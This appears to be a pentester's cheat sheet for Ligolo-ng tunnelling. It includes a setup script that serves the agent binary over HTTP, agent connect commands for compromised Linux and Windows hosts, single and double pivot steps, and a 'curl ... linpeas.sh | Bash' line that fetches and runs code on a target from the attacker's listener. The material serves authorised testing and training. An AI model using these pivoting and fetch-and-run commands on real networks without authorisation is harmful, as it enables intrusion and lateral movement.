---
description: >-
  Ligolo-ng is a simple, lightweight and fast tool that allows pentesters to
  establish tunnels from a reverse TCP/TLS connection using a tun interface
  (without the need of SOCKS).
---

# Quick setup Ligolo

{% embed url="https://youtu.be/5E9PCIJG8sY?si=Twia81xeB7M-GCtu" %}
This custom script can be download below.
{% endembed %}

<details>

<summary>run_ligolo.sh</summary>

```python
#!/bin/bash

# Function to display usage
usage() {
    echo "Usage: $0 [-p platform] [-i ip_route]"
    echo "  -p: Platform (linux or windows)"
    echo "  -i: IP route (e.g., 172.16.1.0/24)"
    exit 1
}

# Function to get tun0 IP
get_tun0_ip() {
    ip addr show tun0 | grep 'inet ' | awk '{print $2}' | cut -d/ -f1
}

# Parse command line arguments
while getopts "p:i:" opt; do
    case $opt in
        p) PLATFORM=$OPTARG ;;
        i) IPROUTE=$OPTARG ;;
        *) usage ;;
    esac
done

# Validate arguments
if [ -z "$PLATFORM" ] || [ -z "$IPROUTE" ]; then
    usage
fi

if [ "$PLATFORM" != "linux" ] && [ "$PLATFORM" != "windows" ]; then
    echo "Error: Platform must be 'linux' or 'windows'"
    exit 1
fi

# Set agent file based on platform
AGENT_FILE="agent"
[ "$PLATFORM" = "windows" ] && AGENT_FILE="agent.exe"

# Setup ligolo interface and route
echo "[+] Setting up ligolo interface..."
sudo ip tuntap add mode tun ligolo || { echo "[-] Failed to create tun interface"; exit 1; }
sudo ip link set ligolo up || { echo "[-] Failed to bring up interface"; exit 1; }
sudo ip route add "$IPROUTE" dev ligolo || { echo "[-] Failed to add route"; exit 1; }
echo "[+] IP route added for $IPROUTE"

# Get tun0 IP
TUN0_IP=$(get_tun0_ip)
if [ -z "$TUN0_IP" ]; then
    echo "[-] Could not determine tun0 IP"
    exit 1
fi

# Start HTTP server in background
echo "[+] Starting HTTP server..."
python3 -m http.server 8000 &
HTTP_PID=$!
echo "[+] File available at http://$TUN0_IP:8000/$AGENT_FILE"

# Start proxy
echo "[+] Starting proxy..."
./proxy -selfcert

# Cleanup
kill $HTTP_PID

```

</details>



Download binairies

{% embed url="https://github.com/nicocha30/ligolo-ng/releases/tag/v0.4.4" %}

#### 1. Setup host

<pre class="language-bash"><code class="lang-bash"># Setup TUN interface and route traffic through target subnet
sudo ip tuntap add user kali mode tun ligolo &#x26;&#x26; sudo ip link set ligolo up &#x26;&#x26; sudo ip route add 172.20.200.0/24 dev ligolo
<strong>
</strong><strong># Add another subnet in case of double pivot
</strong>sudo ip route add 172.20.200.0/24 dev ligolo
</code></pre>

#### 2. Start  Ligolo proxy

```bash
# Start proxy on host
./proxy -selfcert
```

#### 3. Run Ligolo agent on target

```bash
# Start agent on Linux
./agent -connect 172.10.10.10:11601 -ignore-cert

# Start agent on Windows
agent.exe -connect 172.10.10.10:11601 -ignore-cert
```

#### Listeners

For reverse connections you can add listeners. If you want for example run a http server on port 8888 you add a listener.&#x20;

```bash
# Add listener
listener_add --addr 0.0.0.0:8888 --to 127.0.0.1:8888 --tcp

# Run http server
python -m http.server 8888

# You can then Curl 
curl http://172.10.10.10:8888/linpeas.sh | Bash
```

#### Pivotting with Ligolo

{% hint style="info" %}
A. You: 172.10.10.10  --  B. MS01:  10.10.14.14  --  C. BC01: 10.10.200.5
{% endhint %}

```bash
# Copy agent to MS01 run
./agent -connect 172.10.10.10:11601 -ignore-cert
```

#### Double Pivot with Ligolo

```bash
# Add new listener
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp

# Copy agent to BC01 and run
./agent -connect 10.10.14.14:11601 -ignore-cert
```

#### Doube pivot with Ligolo using tun mode

```
// Some code
```
